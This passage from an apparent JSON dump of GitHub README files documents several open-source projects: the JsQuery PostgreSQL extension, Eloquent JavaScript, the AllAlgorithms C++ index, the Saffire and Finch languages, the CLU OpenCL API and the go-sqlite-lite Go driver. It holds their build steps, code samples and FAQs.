placeholders are useful for document\nschema validation. JsQuery matchig operator `@@` is immutable and can be used\nin CHECK constraint. See following example.\n\n```sql\nCREATE TABLE js (\n    id serial,\n    data jsonb,\n    CHECK (data @@ '\n        name IS STRING AND\n        similar_ids.#: IS NUMERIC AND\n        points.#:(x IS NUMERIC AND y IS NUMERIC)'::jsquery));\n```\n\nIn this example check constraint validates that in \"data\" jsonb column:\nvalue of \"name\" key is string, value of \"similar_ids\" key is array of numerics,\nvalue of \"points\" key is array of objects which contain numeric values in\n\"x\" and \"y\" keys.\n\nSee our\n[pgconf.eu presentation](http:\/\/www.sai.msu.su\/~megera\/postgres\/talks\/pgconfeu-2014-jsquery.pdf)\nfor more examples.\n\nGIN indexes\n-----------\n\nJsQuery extension contains two operator classes (opclasses) for GIN which\nprovide different kinds of query optimization.\n\n * jsonb\\_path\\_value\\_ops\n * jsonb\\_value\\_path\\_ops\n\nIn each of two GIN opclasses jsonb documents are decomposed into entries. Each\nentry is associated with particular value and it's path. Difference between\nopclasses is in the entry representation, comparison and usage for search\noptimization.\n\nFor example, jsonb document\n`{\"a\": [{\"b\": \"xyz\", \"c\": true}, 10], \"d\": {\"e\": [7, false]}}`\nwould be decomposed into following entries:\n\n * \"a\".#.\"b\".\"xyz\"\n * \"a\".#.\"c\".true\n * \"a\".#.10\n * \"d\".\"e\".#.7\n * \"d\".\"e\".#.false\n\nSince JsQuery doesn't support search in particular array index, we consider\nall array elements to be equivalent. Thus, each array element is marked with\nsame `#` sign in the path.\n\nMajor problem in the entries representation is its size. In the given example\nkey \"a\" is presented three times. In the large branchy documents with long\nkeys size of naive entries representation becomes unreasonable. Both opclasses\naddress this issue but in a slightly different way.\n\n### jsonb\\_path\\_value\\_ops\n\njsonb\\_path\\_value\\_ops represents entry as pair of path hash and value.\nFollowing pseudocode illustrates it.\n\n    (hash(path_item_1.path_item_2. ... .path_item_n); value)\n\nIn comparison of entries path hash is the higher part of entry and value is\nits lower part. This determines the features of this opclass. Since path\nis hashed and it is higher part of entry we need to know the full path to\nthe value in order to use it for search. However, once path is specified\nwe can use both exact and range searches very efficiently.\n\n### jsonb\\_value\\_path\\_ops\n\njsonb\\_value\\_path\\_ops represents entry as pair of value and bloom filter\nof path.\n\n    (value; bloom(path_item_1) | bloom(path_item_2) | ... | bloom(path_item_n))\n\nIn comparison of entries value is the higher part of entry and bloom filter of\npath is its lower part. This determines the features of this opclass. Since\nvalue is the higher part of entry we can perform only exact value search\nefficiently. Range value search is possible as well but we would have to\nfilter all the the different paths where matching values occur. Bloom filter\nover path items allows index usage for conditions containing `%` and `*` in\ntheir paths.\n\n### Query optimization\n\nJsQuery opclasses perform complex query optimization. Thus it's valuable for\ndeveloper or administrator to see the result of such optimization.\nUnfortunately, opclasses aren't allowed to do any custom output to the\nEXPLAIN. That's why JsQuery provides following functions which allows to see\nhow particular opclass optimizes given query.\n\n * gin\\_debug\\_query\\_path\\_value(jsquery) \u2013 for jsonb\\_path\\_value\\_ops\n * gin\\_debug\\_query\\_value\\_path(jsquery) \u2013 for jsonb\\_value\\_path\\_ops\n\nResult of these functions is a textual representation of query tree which\nleafs are GIN search entries. Following examples show different results of\nquery optimization by different opclasses.\n\n    # SELECT gin_debug_query_path_value('x = 1 AND (*.y = 1 OR y = 2)');\n     gin_debug_query_path_value\n    ----------------------------\n     x = 1 , entry 0           +\n\n    # SELECT gin_debug_query_value_path('x = 1 AND (*.y = 1 OR y = 2)');\n     gin_debug_query_value_path\n    ----------------------------\n     AND                       +\n       x = 1 , entry 0         +\n       OR                      +\n         *.y = 1 , entry 1     +\n         y = 2 , entry 2       +\n\nUnfortunately, jsonb have no statistics yet. That's why JsQuery optimizer has\nto do imperative decision while selecting conditions to be evaluated using\nindex. This decision is made by assumtion that some condition types are less\nselective than others. Optimizer divides conditions into following selectivity\nclass (listed by descending of selectivity).\n\n 1. Equality (x = c)\n 2. Range (c1 < x < c2)\n 3. Inequality (x > c)\n 4. Is (x is type)\n 5. Any (x = \\*)\n\nOptimizer evades index evaluation of less selective conditions when possible.\nFor example, in the `x = 1 AND y > 0` query `x = 1` is assumed to be more\nselective than `y > 0`. That's why index isn't used for evaluation of `y > 0`.\n\n    # SELECT gin_debug_query_path_value('x = 1 AND y > 0');\n     gin_debug_query_path_value\n    ----------------------------\n     x = 1 , entry 0           +\n\nWith lack of statistics decisions made by optimizer can be inaccurate. That's\nwhy JsQuery supports hints. Comments `\/*-- index *\/` and `\/*-- noindex *\/`\nplaced in the conditions forces optimizer to use and not use index\ncorrespondingly.\n\n    SELECT gin_debug_query_path_value('x = 1 AND y \/*-- index *\/ > 0');\n     gin_debug_query_path_value\n    ----------------------------\n     AND                       +\n       x = 1 , entry 0         +\n       y > 0 , entry 1         +\n\n    SELECT gin_debug_query_path_value('x \/*-- noindex *\/ = 1 AND y > 0');\n     gin_debug_query_path_value\n     ----------------------------\n      y > 0 , entry 0           +\n\nContribution\n------------\n\nPlease, notice, that JsQuery is still under development and while it's\nstable and tested, it may contains some bugs. Don't hesitate to raise\n[issues at github](https:\/\/github.com\/postgrespro\/jsquery\/issues) with your\nbug reports.\n\nIf you're lacking of some functionality in JsQuery and feeling power to\nimplement it then you're welcome to make pull requests.\n\n"},{"repo":"\/marijnh\/Eloquent-JavaScript","language":"JavaScript","readme_contents":"# Eloquent JavaScript\n\nThese are the sources used to build the third edition of Eloquent\nJavaScript (https:\/\/eloquentjavascript.net).\n\nFeedback welcome, in the form of issues and pull requests.\n\n## Building\n\nThis builds the HTML output in `html\/`, where `make` is GNU make:\n\n    npm install\n    make html\n\nTo build the PDF file (don't bother trying this unless you really need\nit, since this list has probably bitrotted again and getting all this\nset up is a pain):\n\n    apt-get install texlive texlive-xetex fonts-inconsolata fonts-symbola texlive-lang-chinese inkscape\n    make book.pdf\n\n## Translating\n\nTranslations are very much welcome. The license this book is published\nunder allows non-commercial derivations, which includes open\ntranslations. If you do one, let me know, and I'll add a link to the\nwebsite.\n\nA note of caution though: This text consists of about 130 000 words,\nthe paper book is 400 pages. That's a lot of text, which will take a\nlot of time to translate.\n\nIf that doesn't scare you off, the recommended way to go about a\ntranslation is:\n\n - Fork this repository on GitHub.\n\n - Create an issue on the repository describing your plan to translate.\n\n - Translate the `.md` files in your fork. These are\n   [CommonMark](https:\/\/commonmark.org\/) formatted, with a few\n   extensions. You may consider omitting the index terms (indicated\n   with double parentheses and `{{index ...}}` syntax) from your\n   translation, since that's mostly relevant for print output.\n\n - Publish somewhere online or ask me to host the result.\n\nDoing this in public, and creating an issue that links to your work,\nhelps avoid wasted effort, where multiple people start a translation\nto the same language (and possibly never finish it). (Since\ntranslations have to retain the license, it is okay to pick up someone\nelse's translation and continue it, even when they have vanished from\nthe internet.)\n"},{"repo":"\/AllAlgorithms\/cpp","language":"C++","readme_contents":"\n<!-- Please do not edit this file | This file is authomatically generated by ~\/scripts\/formatter.js -->\n<div align=\"center\">\n<br>\n<br>\n<br>\n<br>\n<img width=\"400\" height=\"270\" src=\"https:\/\/cdn.jsdelivr.net\/npm\/@programming-languages-logos\/cpp@0.0.2\/cpp.svg\">\n<br>\n<br>\n<br>\n<br>\n<br>\n<br>\n<img src=\"https:\/\/cdn.abranhe.com\/projects\/algorithms\/algorithms.svg\" width=\"400px\">\n<br>\n<br>\n<p>All \u25b2lgorithms implemented in C++<\/p>\n<a href=\"https:\/\/allalgorithms.com\"><img src=\"https:\/\/cdn.abranhe.com\/projects\/algorithms\/badge.svg\"><\/a>\n<a href=\"https:\/\/github.com\/abranhe\/algorithms\/blob\/master\/license\"><img src=\"https:\/\/img.shields.io\/github\/license\/abranhe\/algorithms.svg\" \/><\/a>\n<a href=\"https:\/\/cash.me\/$abranhe\"><img src=\"https:\/\/cdn.abranhe.com\/badges\/cash-me.svg\"><\/a>\n<a href=\"https:\/\/patreon.com\/abranhe\"><img src=\"https:\/\/cdn.abranhe.com\/badges\/patreon.svg\" \/><\/a>\n<a href=\"https:\/\/paypal.me\/abranhe\/10\"><img src=\"https:\/\/cdn.abranhe.com\/badges\/paypal.svg\" \/><\/a>\n<a href=\"https:\/\/travis-ci.org\/AllAlgorithms\/cpp\"><img src=\"https:\/\/img.shields.io\/travis\/AllAlgorithms\/cpp.svg?label=%E2%96%B2%20style\" \/><\/a>\n<br>\n<br>\n<a href=\"https:\/\/allalgorithms.com\"><code>allalgorithms.com<\/code><\/a>\n<\/div>\n\n<!-- Please do not edit this file | This file is authomatically generated by ~\/scripts\/formatter.js -->\n\n## Contents\n\nYou can find the All \u25b2lgorithms categories at [algorithms.com\/categories](https:\/\/algorithms.com\/categories)\n\n - [Artificial intelligence](#artificial-intelligence)\n - [Backtracking](#backtracking)\n - [Bit manipulation](#bit-manipulation)\n - [Cellular automaton](#cellular-automaton)\n - [Computational geometry](#computational-geometry)\n - [Cryptography](#cryptography)\n - [Data structures](#data-structures)\n - [Divide and conquer](#divide-and-conquer)\n - [Dynamic programming](#dynamic-programming)\n - [Gaming theory](#gaming-theory)\n - [Graphs](#graphs)\n - [Greedy algorithms](#greedy-algorithms)\n - [Math](#math)\n - [Networking](#networking)\n - [Numerical analysis](#numerical-analysis)\n - [Online challenges](#online-challenges)\n - [Randomized algorithms](#randomized-algorithms)\n - [Serches](#serches)\n - [Selections](#selections)\n - [Sorting](#sorting)\n - [Strings](#strings)\n - [No category](#no-category)\n\n## Artificial intelligence\n\n - [Togasat](artificial-intelligence\/togasat.cpp)\n\n## Backtracking\n\n - [Crossword puzzle](backtracking\/crossword_puzzle.cpp)\n\n## Data structures\n\n - [Pairs with difference k](data-structures\/hashmaps\/pairs_with_difference_k.cpp)\n - [Largest rectangle area](data-structures\/largest_rectangle_area.cpp)\n - [Linkedlist adt](data-structures\/linkedlist\/linkedlist_adt.cpp)\n - [Circular buffer](data-structures\/queue\/circular_buffer.cpp)\n - [Queue](data-structures\/queue\/queue.cpp)\n - [Stack](data-structures\/stack\/stack.cpp)\n\n## Dynamic programming\n\n - [Coin change](dynamic-programming\/coin_change.cpp)\n - [Edit distance](dynamic-programming\/edit_distance.cpp)\n - [Fibonacci number](dynamic-programming\/fibonacci_number.cpp)\n - [Knapsack](dynamic-programming\/knapsack.cpp)\n - [Lcs](dynamic-programming\/lcs.cpp)\n - [Lis](dynamic-programming\/lis.cpp)\n - [Longest path](dynamic-programming\/longest_path.cpp)\n - [Matrix chain multiplication](dynamic-programming\/matrix_chain_multiplication.cpp)\n - [Rod cutting](dynamic-programming\/rod_cutting.cpp)\n - [Ways to cover](dynamic-programming\/ways_to_cover.cpp)\n\n## Graphs\n\n - [Bellman ford](graphs\/bellman_ford.cpp)\n - [Bfs](graphs\/bfs.cpp)\n - [Count diconnected components](graphs\/count_diconnected_components.cpp)\n - [Dfs](graphs\/dfs.cpp)\n - [Dijkstra](graphs\/dijkstra.cpp)\n - [Floyd warshall](graphs\/floyd_warshall.cpp)\n - [Prims adjacency list](graphs\/prims_adjacency_list.cpp)\n - [Toposort](graphs\/toposort.cpp)\n\n## Math\n\n - [All factors of a numbe r](math\/all_factors_of_a_numbe_r.cpp)\n - [Armstrong number](math\/armstrong_number.cpp)\n - [Bshuffll](math\/bshuffll.cpp)\n - [Chefres](math\/chefres.cpp)\n - [Collatz](math\/collatz.cpp)\n - [Euclids gcd](math\/euclids_gcd.cpp)\n - [Eulers totient](math\/eulers_totient.cpp)\n - [Factorial loop](math\/factorial_loop.cpp)\n - [Factorial](math\/factorial.cpp)\n - [Gcd of array](math\/gcd_of_array.cpp)\n - [Hoax no](math\/hoax_no.cpp)\n - [Kadence](math\/kadence.cpp)\n - [Lcm of array](math\/lcm_of_array.cpp)\n - [Lucky numbers](math\/lucky_numbers.cpp)\n - [Magic square](math\/magic_square.cpp)\n - [Modular exponentiation](math\/modular_exponentiation.cpp)\n - [Nth fibonacci using goldenratio](math\/nth_fibonacci_using_goldenratio.cpp)\n - [Pascals triangle](math\/pascals_triangle.cpp)\n - [Sieve of eratosthenes](math\/sieve_of_eratosthenes.cpp)\n - [Slicker algorithm](math\/slicker_algorithm.cpp)\n - [Sphenic n o](math\/sphenic_n_o.cpp)\n - [T ermo conv](math\/t_ermo_conv.cpp)\n\n## Searches\n\n - [Binary search](searches\/binary_search.cpp)\n - [Exponential search](searches\/exponential_search.cpp)\n - [Jump search](searches\/jump_search.cpp)\n - [Linear search](searches\/linear_search.cpp)\n - [Ternary search](searches\/ternary_search.cpp)\n\n## Sorting\n\n - [Bogo sort](sorting\/bogo_sort.cpp)\n - [Bubble sort](sorting\/bubble_sort.cpp)\n - [Counting sort](sorting\/counting_sort.cpp)\n - [Gnome sort](sorting\/gnome_sort.cpp)\n - [Heap sort without vectors](sorting\/heap_sort_without_vectors.cpp)\n - [Heap sort](sorting\/heap_sort.cpp)\n - [Insertion sort](sorting\/insertion_sort.cpp)\n - [Merge sort](sorting\/merge_sort.cpp)\n - [Quick sort](sorting\/quick_sort.cpp)\n - [Radix sort](sorting\/radix_sort.cpp)\n - [Rank sort](sorting\/rank_sort.cpp)\n - [Selection sort](sorting\/selection_sort.cpp)\n - [Shaker sort](sorting\/shaker_sort.cpp)\n - [Shell sort](sorting\/shell_sort.cpp)\n - [Sort vector](sorting\/sort_vector.cpp)\n - [Stooge sort](sorting\/stooge_sort.cpp)\n - [Tree sort](sorting\/tree_sort.cpp)\n\n## Strings\n\n - [Anagram check](strings\/anagram_check.cpp)\n - [Lexicographic ranking](strings\/lexicographic_ranking.cpp)\n - [Longest palindrome subset](strings\/longest_palindrome_subset.cpp)\n - [Naive search](strings\/naive_search.cpp)\n - [Permutations of string](strings\/permutations_of_string.cpp)\n - [Print duplicate string](strings\/print_duplicate_string.cpp)\n - [Rabin carp](strings\/rabin_carp.cpp)\n - [Rabin karp](strings\/rabin_karp.cpp)\n - [Remove adjacent duplicates](strings\/remove_adjacent_duplicates.cpp)\n - [Remove duplicates](strings\/remove_duplicates.cpp)\n - [Reverse string](strings\/reverse_string.cpp)\n - [Z algorithm](strings\/z_algorithm.cpp)\n\n<!-- Please do not edit this file | This file is authomatically generated by ~\/scripts\/formatter.js -->\n\n## Maintainers\n\n|[![1][1-avatar]][1]|[![2][2-avatar]][2]|\n| :-: | :-: |\n| [Carlos Abraham][1] | [Christian Bender][2] |\n\n## License\n\nThis work is released under [MIT License][MIT]\n\n[![MIT IMG][MIT-logo]][MIT]\n\nTo the extent possible under law, [Carlos Abraham](https:\/\/go.abranhe.com\/github) has waived all copyright and related or neighboring rights to this work.\n\n<div align=\"center\">\n\t<a href=\"https:\/\/github.com\/abranhe\/algorithms\">\n\t\t<img src=\"https:\/\/cdn.abranhe.com\/projects\/algorithms\/logo.svg\" width=\"50px\">\n\t<\/a>\n  <br>\n<\/div>\n\n[MIT]: https:\/\/github.com\/abranhe\/algorithms\/blob\/master\/license\n[MIT-logo]: https:\/\/cdn.abranhe.com\/projects\/algorithms\/mit-license.png\n\n<!-- Maintainers -->\n[1]: https:\/\/github.com\/abranhe\n[1-avatar]: https:\/\/avatars3.githubusercontent.com\/u\/21347264?s=50\n[2]: https:\/\/github.com\/christianbender\n[2-avatar]: https:\/\/avatars3.githubusercontent.com\/u\/23243382?s=50\n"},{"repo":"\/saffire\/saffire","language":"C","readme_contents":"Saffire\n=======\n\n[![Build Status](https:\/\/travis-ci.org\/saffire\/saffire.png)](https:\/\/travis-ci.org\/saffire\/saffire)\n[![Gitter](https:\/\/badges.gitter.im\/Join%20Chat.svg)](https:\/\/gitter.im\/saffire\/saffire?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge)\n\nA new OO programming scripting language, based on primarily Python, PHP and Ruby. Its primary features:\n\n- interpreted language\n- dynamically, strong typed\n- everything is an object\n- full unicode support\n- method + operator overloading\n\nMore information can be found at our website: http:\/\/www.saffire-lang.org and we're on IRC (freenode) as well, join us\nin channel \\#saffire.\n\n\nContributing:\n-------------\nWe LOVE new contributors. Please join the \\#saffire channel at IRC (freenode) for more information about contributing\nto the project. There is no need have deep knowledge of C or knowing lots about compilers and stuff. There are lots of\nother things that needs to be done and all the help on every level is welcome! Also, we love to meet new people, so\ncome and say hi to us.\n\n\nInstalling Saffire\n------------------\nThere are two ways to install Saffire. The easy way, and the hard way :) The easy way consists of setting up a\nvirtualbox environment that will automatically install everything you need through the help of vagrant. The hard way,\nwell, you do everything yourself. Please read the information in the [installation file](documentation\/Installation.md)\non how to install Saffire.\n\n\nUsing Saffire\n-------------\nSaffire is under construction and experience heavy redesign on occasion for as long as we haven't hit a stable release.\nObviously, the closer we get, the less things will change and the current base is getting pretty solid fortunately.\nPlease checkout the [usage documentation](documentation\/Usage.md) file in order to figure out how to start with Saffire.\n"},{"repo":"\/Computing-Language-Utility\/CLU","language":"C++","readme_contents":"The Computing Language Utility (CLU) is a lightweight API designed to help programmers explore, learn, and rapidly prototype programs with OpenCL.  This API reduces the complexity associated with initializing OpenCL devices, contexts, kernels and parameters, etc. while preserving the ability to drop down to the lower level OpenCL API at will when programmers wants to get their hands dirty. The CLU release includes an open source implementation along with documentation and samples that demonstrate how to use CLU in real applications.  It has been tested on Windows 7 with Visual Studio  and OS X.\n"},{"repo":"\/munificent\/finch","language":"C++","readme_contents":"Finch is a simple bytecode interpreted, purely object-oriented,\nprototype-based, dynamically-typed programming language. It's mostly\ninspired by Smalltalk, Self, and Javascript.\n\nIt is written in C++ with a hand-written lexer and parser. It has\nminimal dependencies. I want Finch to be:\n\n*   Syntactically expressive yet minimal. Your code should look beautiful and\n    do what you want.\n\n*   An example of a small, clean C++ codebase for an interpreter. If you can\n    read C++ and want to learn more about programming languages, I hope Finch's\n    code will be a good primer.\n\n*   A language in the Smalltalk family that's friendly to people coming from a\n    text file and curly brace background.\n\n*   A minimal prototype-based dynamic language. I think prototypes are a really\n    cool paradigm, but Self goes too far, and Javascript doesn't go far enough.\n\n*   Easily embeddable in other applications. I don't know if Finch ever will\n    have real use, but if it does, it will likely be as a configuration or\n    scripting language within a larger application, much like Lua.\n\n\nA Taste of the Language\n-----------------------\n\nHere's a little example to get you going. This little program doesn't\ndraw, but it will tell you what turns to make to draw a dragon curve:\n\n    \/\/ create an object and put it in a variable \"dragon\"\n    dragon <- [\n      \/\/ define a \"trace:\" method for outputting the series of left and\n      \/\/ right turns needed to draw a dragon curve.\n      trace: depth {\n        self traceDepth: depth turn: \"R\"\n        writeLine: \"\" \/\/ end the line\n      }\n\n      \/\/ the main recursive method\n      traceDepth: n turn: turn {\n        if: n > 0 then: {\n          self traceDepth: n - 1 turn: \"R\"\n          write: turn\n          self traceDepth: n - 1 turn: \"L\"\n        }\n      }\n    ]\n\n    \/\/ now lets try it\n    dragon trace: 5\n\n\nGetting Started\n---------------\n\nFinch lives on github here: https:\/\/github.com\/munificent\/finch\n\nTo play around with it, sync it down. Finch uses GYP to generate projects or\nmakefiles for your platform, which you then build to get an executable.\n\n1. Download GYP from: http:\/\/code.google.com\/p\/gyp\/\n2. Clone the finch repo from github.\n3. In a terminal\/command prompt, navigate to the root finch\/ directory.\n4. Run GYP on this file: `<path to gyp>\/gyp --depth=1`\n   Where `<path to gyp>` is wherever you downloaded GYP to in step 1.\n   This should spit out a project\/makefile in the root directory for your\n   platform.\n5. Open that project in XCode or VS and build, or build the makefile.\n6. Ta-da! You should now have a Finch executable under a build\/ directory.\n\nLet me know if you run into any problems.\n\n\nRunning Finch\n-------------\n\nOnce you've got it built and running, you'll be at the main\ninterpreter prompt. Finch is a command-line app. If you run it without\nany arguments, it drops you into a REPL, an interactive session. You\ncan type in chunks of code and it will interpret them immediately. (If\nyou run it with a single argument, it expects that to be a path to a\n.fin script, and it will load and run that script.)\n\nOnce you're in the REPL, you can load and execute a script using\nload:. The path must be relative to where the executable is right now (lame!).\nYou can run the tests like this:\n\n    >> load: \"..\/..\/test\/test.fin\"\n\n\nWhere to Go from Here\n---------------------\n\nYou should be good to start hacking some Finch code now. There is some\ndocumentation here:\n\n* http:\/\/finch.stuffwithstuff.com\n* http:\/\/journal.stuffwithstuff.com\/category\/finch\/\n\nIf you have any questions or comments, holler at me."},{"repo":"\/bvinc\/go-sqlite-lite","language":"C","readme_contents":"[![GoDoc](https:\/\/godoc.org\/github.com\/bvinc\/go-sqlite-lite\/sqlite3?status.svg)](https:\/\/godoc.org\/github.com\/bvinc\/go-sqlite-lite\/sqlite3)\n[![Build Status](https:\/\/travis-ci.com\/bvinc\/go-sqlite-lite.svg?branch=master)](https:\/\/travis-ci.com\/bvinc\/go-sqlite-lite)\n[![Build status](https:\/\/ci.appveyor.com\/api\/projects\/status\/xk6fpk23wb5ppdhx?svg=true)](https:\/\/ci.appveyor.com\/project\/bvinc\/go-sqlite-lite)\n[![Coverage Status](https:\/\/coveralls.io\/repos\/github\/bvinc\/go-sqlite-lite\/badge.svg?branch=master)](https:\/\/coveralls.io\/github\/bvinc\/go-sqlite-lite?branch=master)\n[![Go Report Card](https:\/\/goreportcard.com\/badge\/github.com\/bvinc\/go-sqlite-lite)](https:\/\/goreportcard.com\/report\/github.com\/bvinc\/go-sqlite-lite)\n\n# go-sqlite-lite\n\ngo-sqlite-lite is a SQLite driver for the Go programming language.  It is designed with the following goals in mind.\n\n* **Lightweight** - Most methods should be little more than a small wrapper around SQLite C functions.\n* **Performance** - Where possible, methods should be available to allow for the highest performance possible.\n* **Understandable** - You should always know what SQLite functions are being called and in what order.\n* **Unsurprising** - Connections, PRAGMAs, transactions, bindings, and stepping should work out of the box exactly as you would expect with SQLite.\n* **Debuggable** - When you encounter a SQLite error, the SQLite documentation should be relevant and relatable to the Go code.\n* **Ergonomic** - Where it makes sense, convenient compound methods should exist to make tasks easy and to conform to Go standard interfaces.\n\nMost database drivers include a layer to work nicely with the Go `database\/sql` interface, which introduces connection pooling and behavior differences from pure SQLite.  This driver does not include a `database\/sql` interface.\n\n## Releases\n\n* 2019-05-01 **v0.6.1** - Bug fixes, authorizer callback support\n* 2019-05-01 **v0.6.0** - SQLite version 3.28.0\n* 2019-02-05 **v0.5.0** - SQLite version 3.26.0\n* 2018-10-30 **v0.4.2** - Better error messages from SQLite\n* 2018-10-11 **v0.4.1** - Fixed an issue with new go 1.11 modules\n* 2018-09-29 **v0.4.0** - SQLite version 3.25.2.  Add support for the Session extension\n* 2018-09-16 **v0.3.1** - Forgot to update sqlite3.h\n* 2018-09-16 **v0.3.0** - SQLite version 3.25.0\n* 2018-09-14 **v0.2.0** - Proper error and NULL handling on Column* methods.  Empty blobs and empty strings are now distinct from NULL in all cases.  A nil byte slice is interpreted as NULL for binding purposes as well as Column* methods.\n* 2018-09-01 **v0.1.2** - Added Column methods to Stmt, and WithTx methods to Conn\n* 2018-08-25 **v0.1.1** - Fixed linking on some Linux systems\n* 2018-08-21 **v0.1.0** - SQLite version 3.24.0\n\n## Getting started\n\n```go\nimport \"github.com\/bvinc\/go-sqlite-lite\/sqlite3\"\n```\n\n### Acquiring a connection\n```go\nconn, err := sqlite3.Open(\"mydatabase.db\")\nif err != nil {\n\t...\n}\ndefer conn.Close()\n\n\/\/ It's always a good idea to set a busy timeout\nconn.BusyTimeout(5 * time.Second)\n```\n\n### Executing SQL\n```go\nerr = conn.Exec(`CREATE TABLE student(name TEXT, age INTEGER)`)\nif err != nil {\n\t...\n}\n\/\/ Exec can optionally bind parameters\nerr = conn.Exec(`INSERT INTO student VALUES (?, ?)`, \"Bob\", 18)\nif err != nil {\n\t...\n}\n```\n\n### Using Prepared Statements\n```go\nstmt, err := conn.Prepare(`INSERT INTO student VALUES (?, ?)`)\nif err != nil {\n\t...\n}\ndefer stmt.Close()\n\n\/\/ Bind the arguments\nerr = stmt.Bind(\"Bill\", 18)\nif err != nil {\n\t...\n}\n\/\/ Step the statement\nhasRow, err := stmt.Step()\nif err != nil {\n\t...\n}\n\/\/ Reset the statement\nerr = stmt.Reset()\nif err != nil {\n\t...\n}\n```\n\n### Using Prepared Statements Conveniently\n```go\nstmt, err := conn.Prepare(`INSERT INTO student VALUES (?, ?)`)\nif err != nil {\n\t...\n}\ndefer stmt.Close()\n\n\/\/ Exec binds arguments, steps the statement to completion, and always resets the statement\nerr = stmt.Exec(\"John\", 19)\nif err != nil {\n\t...\n}\n```\n\n### Using Queries Conveniently\n```go\n\/\/ Prepare can prepare a statement and optionally also bind arguments\nstmt, err := conn.Prepare(`SELECT name, age FROM student WHERE age = ?`, 18)\nif err != nil {\n\t...\n}\ndefer stmt.Close()\n\nfor {\n\thasRow, err := stmt.Step()\n\tif err != nil {\n\t\t...\n\t}\n\tif !hasRow {\n\t\t\/\/ The query is finished\n\t\tbreak\n\t}\n\n\t\/\/ Use Scan to access column data from a row\n\tvar name string\n\tvar age int\n\terr = stmt.Scan(&name, &age)\n\tif err != nil {\n\t\t...\n\t}\n\tfmt.Println(\"name:\", name, \"age:\", age)\n}\n\/\/ Remember to Reset the statement if you would like to Bind new arguments and reuse the prepared statement\n```\n\n### Getting columns that might be NULL\nScan can be convenient to use, but it doesn't handle NULL values.  To get full control of column values, there are column methods for each type.\n```go\nname, ok, err := stmt.ColumnText(0)\nif err != nil {\n\t\/\/ Either the column index was out of range, or SQLite failed to allocate memory\n\t...\n}\nif !ok {\n\t\/\/ The column was NULL\n}\n\nage, ok, err := stmt.ColumnInt(1)\nif err != nil {\n\t\/\/ Can only fail if the column index is out of range\n\t...\n}\nif !ok {\n\t\/\/ The column was NULL\n}\n```\n\n`ColumnBlob` returns a nil slice in the case of NULL.\n```go\nblob, err := stmt.ColumnBlob(i)\nif err != nil {\n\t\/\/ Either the column index was out of range, or SQLite failed to allocate memory\n\t...\n}\nif blob == nil {\n\t\/\/ The column was NULL\n}\n```\n\n\n\n### Using Transactions\n```go\n\/\/ Equivalent to conn.Exec(\"BEGIN\")\nerr := conn.Begin()\nif err != nil {\n\t...\n}\n\n\/\/ Do some work\n...\n\n\/\/ Equivalent to conn.Exec(\"COMMIT\")\nerr = conn.Commit()\nif err != nil {\n\t...\n}\n```\n\n### Using Transactions Conveniently\n\nWith error handling in Go, it can be pretty inconvenient to ensure that a transaction is rolled back in the case of an error.  The `WithTx` method is provided, which accepts a function of work to do inside of a transaction.  `WithTx` will begin the transaction and call the function.  If the function returns an error, the transaction will be rolled back.  If the function succeeds, the transaction will be committed.  `WithTx` can be a little awkward to use, but it's necessary.  For example:\n\n```go\nerr := conn.WithTx(func() error {\n\treturn insertStudents(conn)\n})\nif err != nil {\n\t...\n}\n\nfunc insertStudents(conn *sqlite3.Conn) error {\n\t...\n}\n```\n\n## Advanced Features\n* Binding parameters to statements using SQLite named parameters.\n* SQLite Blob Incremental IO API.\n* SQLite Online Backup API.\n* SQLite Session extension.\n* Supports setting a custom busy handler\n* Supports callback hooks on commit, rollback, and update.\n* Supports setting compile-Time authorization callbacks.\n* If shared cache mode is enabled and one statement receives a `SQLITE_LOCKED` error, the SQLite [unlock_notify](https:\/\/sqlite.org\/unlock_notify.html) extension is used to transparently block and try again when the conflicting statement finishes.\n* Compiled with SQLite support for JSON1, RTREE, FTS5, GEOPOLY, STAT4, and SOUNDEX.\n* Compiled with SQLite support for OFFSET\/LIMIT on UPDATE and DELETE statements.\n* RawString and RawBytes can be used to reduce copying between Go and SQLite.  Please use with caution.\n\n## Credit\nThis project began as a fork of https:\/\/github.com\/mxk\/go-sqlite\/\n\n## FAQ\n\n* **Why is there no `database\/sql` interface?**\n\nIf a `database\/sql` interface is required, please use https:\/\/github.com\/mattn\/go-sqlite3 .  In my experience, using a `database\/sql` interface with SQLite is painful.  Connection pooling causes unnecessary overhead and weirdness.  Transactions using `Exec(\"BEGIN\")` don't work as expected.  Your connection does not correspond to SQLite's concept of a connection.  PRAGMA commands do not work as expected.  When you hit SQLite errors, such as locking or busy errors, it's difficult to discover why since you don't know which connection received which SQL and in what order.\n\n* **What are the differences between this driver and the mxk\/go-sqlite driver?**\n\nThis driver was forked from `mxk\/go-sqlite-driver`.  It hadn't been maintained in years and used an ancient version of SQLite.  A large number of features were removed, reworked, and renamed.  A lot of smartness and state was removed.  It is now much easier to upgrade to newer versions of SQLite since the `codec` feature was removed.  The behavior of methods now lines up closely with the behavior of SQLite's C API.\n\n* **What are the differences between this driver and the crawshaw\/sqlite driver?**\n\nThe crawshaw driver is pretty well thought out and solves a lot of the same problems as this\ndriver.  There are a few places where our philosophies differ.  The crawshaw driver defaults (when flags of 0 are given) to SQLite shared cache mode and WAL mode.  The default WAL synchronous mode is changed.  Prepared statements are transparently cached.  Connection pools are provided.  I would be opposed to making most of these changes to this driver.  I would like this driver to provide a default, light, and unsurprising SQLite experience.\n\n* **Are finalizers provided to automatically close connections and statements?**\n\nNo finalizers are used in this driver.  You are responsible for closing connections and statements.  While I mostly agree with finalizers for cleaning up most accidental resource leaks, in this case, finalizers may fix errors such as locking errors while debugging only to find that the code works unreliably in production.  Removing finalizers makes the behavior consistent.\n\n* **Is it thread safe?**\n\ngo-sqlite-lite is as thread safe as SQLite.  SQLite with this driver is compiled with `-DSQLITE_THREADSAFE=2` which is **Multi-thread** mode.  In this mode, SQLite can be safely used by multiple threads provided that no single database connection is used simultaneously in two or more threads.  This applies to goroutines.  A single database connection should not be used simultaneously between two goroutines.\n\nIt is safe to use separate connection instances concurrently, even if they are accessing the same database file. For example:\n```go\n\/\/ ERROR (without any extra synchronization)\nc, _ := sqlite3.Open(\"sqlite.db\")\ngo use(c)\ngo use(c)\n```\n```go\n\/\/ OK\nc1, _ := sqlite3.Open(\"sqlite.db\")\nc2, _ := sqlite3.Open(\"sqlite.db\")\ngo use(c1)\ngo use(c2)\n```\n\nConsult the SQLite documentation for more information.\n\nhttps:\/\/www.sqlite.org\/threadsafe.html\n\n* **How do I pool connections for handling HTTP requests?**\n\nOpening new connections is cheap and connection pooling is generally unnecessary for SQLite.  I would recommend that you open a new connection for 